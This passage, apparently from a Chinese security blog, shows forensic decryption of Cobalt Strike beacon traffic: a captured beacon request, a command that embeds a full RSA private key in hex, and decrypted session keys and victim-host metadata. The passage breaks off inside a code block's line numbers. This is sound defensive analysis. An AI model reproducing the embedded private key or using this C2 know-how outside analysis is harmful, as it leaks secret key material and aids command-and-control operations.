<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;en_US&#x2F;all.js HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Cookie: IyltNSnpj6lSGi0WGIaJIsFWg6Ko6V+20xExzajz0A3AkRi2MMWjLSZvHltXLFJg5joFEKQ8lQYKh96XCYfDMO3yWWCzyZdpoCLdWRNzR8FN3Z3buww8afGOhKe+NVEWFzTPafNZh3kFlWUf5zk&#x2F;etCn8WPy4qg4BArMvbx&#x2F;yqM&#x3D;</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident&#x2F;6.0; MASP)</span><br><span class="line">Host: 192.168.31.170</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure>

<h3 id="raw-key获取"><a href="#raw-key获取" class="headerlink" title="raw key获取"></a>raw key获取</h3><p>在我们获得私钥和加密的元数据后我们就可以用cs-decrypt-metadata.py  -p   私钥的hex值  加密的元数据 来进行解密。cs-decrypt-metadata.py的下载链接（<a href="https://github.com/DidierStevens/DidierStevensSuite/blob/e28089a6d3f688cf9cd7b7bada9d95ab586e0541/cs-decrypt-metadata.py）" target="_blank" rel="noopener">https://github.com/DidierStevens/DidierStevensSuite/blob/e28089a6d3f688cf9cd7b7bada9d95ab586e0541/cs-decrypt-metadata.py）</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">python3 .&#x2F;cs-decrypt-metadata.py -p 30820276020100300d06092a864886f70d0101010500048202603082025c0201000281810093b4127271907b80352c6a15b6bb1701bd01657a2fba3ca1fba56d9a13e9f1f3121ac3aa70248f8621217fddfc0a484e78ebf4e5b48bb4804eababe5366cf4886b6ce2a5a113edd851fc5b2fb62a925043354000bbae7f2f75d7b0b7097a17b7c7de195174d4b17cee1499ae1e52e3ce3eec3f70011d971d022c0a8723def11d020301000102818069fee4ea1a135c7d922b306a2abb32747de59da444d1faa72806fc9380ccf763bf4f53b1614eeb6c8f24123604a480654823d4986fab7e3a41bab2de07e3c2cb6ec3a6dec4a8e8a22820bbb020a3cfe307978bc11d78551e6fc69dc058170b65cfb3d434827bf5e3c5030cd55fe94a8e4bfcada77ade6c3302417509b2e39225024100fcc826f55f2e5c1e3aa352707dff894ae493fac51570250bf2b80743e41ec66ea08d81f7f68c572183764e27506cecc0b562cc0f1b7e0a9da09d2f472575da8f024100959574bea8438053188e895c2da2c44fe54530ea522fdbeaccc5279755535f8ad61a9c7f3cfe7decaf85031a2ce52990100b5f130e5c5e457c0acd6832a2ff9302400cf8ac5f1d024101e01a6f698c5da78aeb4dd8a9725f2dd77e1e0969677458d46672bc7f9fec35b0679193931ae26c07bb871557951e93a6e10e0fd603cb176b02401b0e537580dde4c222f8f5237525b1b879d1d00d321c71fcc05910d6309ac9f744cebf6bcc4e83dc61caff4aa6c0348a583c964fce132b020a73b1bf9d191a7d024100cd61443812aa2e77c8651e20e80b6e22e81270cebb9d4dcaa68e8ff63159b272eb32385ce91bf27ca5ab9d092978dc7c1866a04eb38a9535de5f1723952be9d2 IyltNSnpj6lSGi0WGIaJIsFWg6Ko6V+20xExzajz0A3AkRi2MMWjLSZvHltXLFJg5joFEKQ8lQYKh96XCYfDMO3yWWCzyZdpoCLdWRNzR8FN3Z3buww8afGOhKe+NVEWFzTPafNZh3kFlWUf5zk&#x2F;etCn8WPy4qg4BArMvbx&#x2F;yqM&#x3D;</span><br><span class="line">Encrypted metadata: IyltNSnpj6lSGi0WGIaJIsFWg6Ko6V+20xExzajz0A3AkRi2MMWjLSZvHltXLFJg5joFEKQ8lQYKh96XCYfDMO3yWWCzyZdpoCLdWRNzR8FN3Z3buww8afGOhKe+NVEWFzTPafNZh3kFlWUf5zk&#x2F;etCn8WPy4qg4BArMvbx&#x2F;yqM&#x3D;</span><br><span class="line">Decrypted:</span><br><span class="line">Header: 0000beef</span><br><span class="line">Datasize: 0000005d</span><br><span class="line">Raw key:  a4553adf7a841e1dcf708afc912275ee</span><br><span class="line"> aeskey:  a368237121ef51b094068a2e92304d46</span><br><span class="line"> hmackey: b6315feb217bd87188d06870dd92855b</span><br><span class="line">charset: 03a8 ANSI&#x2F;OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)</span><br><span class="line">charset_oem: 03a8 ANSI&#x2F;OEM Simplified Chinese (PRC, Singapore); Chinese Simplified (GB2312)</span><br><span class="line">bid: 5f96edca 1603726794</span><br><span class="line">pid: 0acc 2764</span><br><span class="line">port: 0</span><br><span class="line">flags: 0e</span><br><span class="line">var1: 6</span><br><span class="line">var2: 2</span><br><span class="line">var3: 9200</span><br><span class="line">var4: 32760</span><br><span class="line">var5: 265866928</span><br><span class="line">var6: 265854304</span><br><span class="line">var7: 2507253952</span><br><span class="line">Field: b&#39;WIN-8FC6TKPDPOR&#39;</span><br><span class="line">Field: b&#39;Administrator&#39;</span><br><span class="line">Field: b&#39;artifact.exe&#39;</span><br></pre></td></tr></table></figure>

<p>解密后我们就可以Raw key 值。</p>
<h3 id="流量包解密"><a href="#流量包解密" class="headerlink" title="流量包解密"></a>流量包解密</h3><p>在我们获取Raw key 后,我们就可以利用cs-parse-traffic.py脚本来解密流量包，但是在网上流传的脚本都不是最新的不能自动话处理且对处理GBK编码的数据会报错，于是拿着Didier Stevens 小改一下，把非utf-8的数据base64化后输出。但是还是有问题遇到非cs流量不能完美跳过。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span 